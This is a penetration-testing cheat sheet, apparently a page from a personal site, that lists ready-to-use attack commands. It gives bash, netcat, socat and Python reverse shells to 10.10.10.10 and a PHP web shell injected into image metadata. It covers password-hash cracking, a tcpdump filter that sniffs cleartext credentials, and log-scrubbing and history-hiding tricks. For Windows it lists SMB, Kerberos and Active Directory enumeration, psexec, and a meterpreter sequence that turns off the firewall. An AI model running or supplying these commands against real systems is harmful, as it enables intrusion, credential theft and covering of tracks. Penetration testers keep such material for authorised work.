---
layout: cheatsheet
title: Pentest Cheatsheet
icon: fa-list
order: 4
---

## PENTEST CHEATSHEET
### Linux

Find user owned files
~~~
find / -user $(whoami) 2>/dev/null | egrep -v '(/proc)'
~~~

Find writeable files
~~~
find / -writeable 2>/dev/null | egrep -v '(/proc|/run|/dev)'
~~~

Find readable files with following extensions
~~~
find / -readable 2>/dev/null | egrep '(\.key$|\.pub$|\.bak$|\.crt$|\.ca$|^id_rsa)'
~~~

Bash reverse shell
~~~
bash -i >& /dev/tcp/10.10.10.10/444 0>&1
~~~

Netcat reverse shell
~~~
nc -e /bin/bash 10.10.10.10 444
nc -e /bin.sh 10.10.10.10 444
~~~

Socat reverse shell
~~~
socat file:`tty`,raw,echo=0 tcp-listen:444 #listener
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:444 #payload
~~~

Python reverse shell
~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
~~~

Upgrade shell with Python
~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
F+G+ENTER
export TERM=xterm
~~~

Fix terminal
~~~
stty -a
stty cols rows
~~~

Find files that aren't installed by the system
~~~
for i in $(ls $(pwd)/*); do dpkg --search $i 1>/dev/null; done
~~~

Inject PHP into image
~~~
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
~~~

Cracking SSH
~~~
ssh2john id_rsa > id_rsa.hash
john --wordlist=wordlist.txt id_rsa.hash
~~~

Cracking /etc/shadow
~~~
unshadow passwd.hashes shadow.hashes > unshadowed_passwords.txt
john --wordlist=wordlist.txt passwords.txt
~~~

WFUZZ
~~~
wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc 404,500 -u http://10.10.10.168:8080/
~~~

### Hiding tracks

Hiding bash history
~~~
unset HISTFILE
~~~

Commit 'suicide' when exiting shell
~~~
kill -9 $$
~~~

Hide commands
~~~
exec -a syslogd <command here>
~~~

Hide from /var/log/utmp, `w`, `who`, `.profile`, `.bash_profile`, `known_hosts`.
~~~
ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
~~~

SSH tunnel out
~~~
# bypass local firewalls or IP filtering
# connect to localhost:31337 and get connected to 1.2.4.3:80 appearing as user@host.org
ssh -g -L31337:1.2.3.4:80 user@host.org
~~~

SSH tunnel in
~~~
# access private machine
# connect to host.org:31338 get forwarded to 10.10.10.10:80 via localhost
ssh -o ExitOnForwardFailure=yes -g -R31338:10.10.10.10:80 user@host.org
~~~

SSH socks4/5 IN
~~~
# reverse dynamic forwarding
# configure host.org:1080 as SOCKS4/5 proxy and connect to any internal address/port where the system SSH was executed from has access to
ssh -R 1080 user@host.org
~~~

Monitor new TCP connections
~~~
tcpdump -n "tcp[tcpflags] == tcp-syn"
~~~

Other TCPDUMP
~~~
tcpdump -i eth0 'port 80'
tcpdump -i eth0 [udp | proto 17]
tcpdump -vv -x -X -s 1500 -i eth0 'port 80'
tcpdump -i eth0 host 10.10.10.10
tcpdump -i eth0 dst 10.10.10.10
tcpdump -i eth0 -n icmp
tcpdump dst port 123
tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
~~~

Clear logfile
~~~
cd /dev/shm
grep -v '10\.10\.10\.10' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
~~~

### Windows

SMB
~~~
smbclient -L //10.10.10.10 #list shares
smbclient -U ''
smbmap -H 10.10.10.10 #list shares
smbmap -R [share] -H 10.10.10.10 #list contents of share
smbmap -d domain -u user -p password -H 10.10.10.10 #login with user
crackmapexec smb 10.10.10.10 --shares -u '' -p ''
~~~

GPP groups.xml
~~~
gpp-decrypt hash
~~~

Active Directory: impacket
~~~
GetADUsers.py -all domain/user -dc-ip 10.10.10.10
GetUserSPN.py -request[-user] [user] -dc-ip 10.10.10.10 domain/user #kerberoast
~~~

Active Directory
~~~
rpcclient 10.10.10.10
rpcclient 10.10.10.10 -U ''
enumdomusers
~~~

Kerberos
~~~
kerbrute userenum --dc 10.10.10.10 -d domain -o outfile.out users.lst
~~~

Create session with credentials for remote access only
~~~
runas /netonly /user:domain\username cmd
~~~

Shell via SMB: psexec.py
~~~
psexec.py domain/user@10.10.10.10
~~~

Metasploit windows meterpreter session
~~~
execute -f cmd.exe -c -H
shell
netsh firewall show opmode
netsh advfirewall set allprofiles state off
getsystem
~~~